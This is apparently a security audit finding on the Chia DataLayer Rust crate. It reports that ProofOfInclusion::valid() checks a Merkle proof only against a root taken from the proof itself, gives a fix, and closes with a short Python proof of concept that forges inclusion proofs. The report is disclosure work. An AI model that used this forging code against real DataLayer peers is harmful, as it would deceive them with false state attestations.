### Title
`ProofOfInclusion::valid()` Validates Against Its Own Attacker-Controlled Root, Allowing Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` derives the expected Merkle root from the proof object itself (`self.root_hash()` returns `last.combined_hash`, a field inside the proof), rather than accepting an externally-trusted root as a parameter. An attacker who supplies a `ProofOfInclusion` from an untrusted source can forge a self-consistent proof for any arbitrary `node_hash`, and `valid()` will return `true`. This is the direct structural analog of the reported `transferFrom(follower, ...)` pattern: the "authority" (trusted root / trusted `from` address) is taken from attacker-controlled input instead of from a verified external source.

### Finding Description

`ProofOfInclusion` is a Streamable struct exposed via Python bindings. Its `valid()` method is the sole verification API:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← tautology
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← comes from the proof itself
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop completes successfully, `existing_hash` equals the last `layer.combined_hash`. `self.root_hash()` also returns `last.combined_hash`. Therefore the final check `existing_hash == self.root_hash()` is **always true** when the loop passes — it is a tautology. `valid()` only verifies internal self-consistency of the proof, never comparing against any externally-trusted root.

The struct is fully constructible from untrusted bytes via the `Streamable` derive and Python `from_bytes()` / `__new__()` bindings: [3](#0-2) [4](#0-3) 

Contrast this with the consensus `MerkleSet` proof validator, which correctly requires an external root:

```rust
pub fn validate_merkle_proof(proof: &[u8], item: &[u8; 32], root: &[u8; 32]) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root { return Err(SetError); }
    Ok(tree.generate_proof(item)?.0)
}
``` [5](#0-4) 

The DataLayer `ProofOfInclusion::valid()` has no equivalent external-root parameter.

### Impact Explanation

Any DataLayer client that receives a `ProofOfInclusion` from an untrusted peer (e.g., over the DataLayer sync protocol), calls `proof.valid()`, and trusts the result as proof that `proof.node_hash` is committed in a tree with root `proof.root_hash()` is fully deceived. An attacker can:

1. Construct `ProofOfInclusion { node_hash: FAKE_HASH, layers: [] }` — `valid()` returns `true` because `existing_hash (= FAKE_HASH) == self.root_hash() (= FAKE_HASH)`.
2. Construct a multi-layer proof with any desired `node_hash` and a chain of consistent but fabricated hashes — `valid()` returns `true` because each `calculated_hash == layer.combined_hash` by construction, and the final tautology holds.

This lets untrusted input prove invalid DataLayer state: forged inclusion of arbitrary key-value pairs in a DataLayer store, enabling false state attestations. This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."**

### Likelihood Explanation

The `valid()` method is the primary and only proof-verification API on `ProofOfInclusion`. It is exposed to Python via `py_valid()`. Any DataLayer implementation that receives proofs from peers and calls `valid()` without separately comparing `proof.root_hash()` against a locally-known committed root is vulnerable. The misleading API name (`valid`) strongly encourages callers to treat a `true` return as a complete security guarantee. [6](#0-5) 

### Recommendation

`valid()` must accept an external trusted root and compare against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against external root, not self.root_hash()
}
```

The existing `valid()` (no-argument form) should either be removed or clearly documented as "checks internal consistency only — does NOT verify against any trusted root." The Python binding should expose `valid_against_root(root: bytes32)` as the primary API for proof verification from untrusted sources.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer

# Forge a proof-of-inclusion for an arbitrary hash with zero layers
fake_node_hash = bytes([0xAB] * 32)
forged = ProofOfInclusion(node_hash=fake_node_hash, layers=[])

assert forged.valid()           # True — tautology: fake_node_hash == fake_node_hash
assert forged.root_hash() == fake_node_hash  # attacker controls the "root"

# Forge a multi-layer proof for a different arbitrary hash
import hashlib
node_hash = bytes([0x11] * 32)
other_hash = bytes([0x22] * 32)
# compute what combined_hash must be for the layer to be consistent
combined = hashlib.sha256(b"\x02" + other_hash + node_hash).digest()  # Side.Left
layer = ProofOfInclusionLayer(other_hash_side=0, other_hash=other_hash, combined_hash=combined)
forged2 = ProofOfInclusion(node_hash=node_hash, layers=[layer])

assert forged2.valid()          # True — self-consistent fabricated proof
# Caller believes node_hash=0x11..11 is in a tree with root=combined
# Neither is true in any real MerkleBlob
```
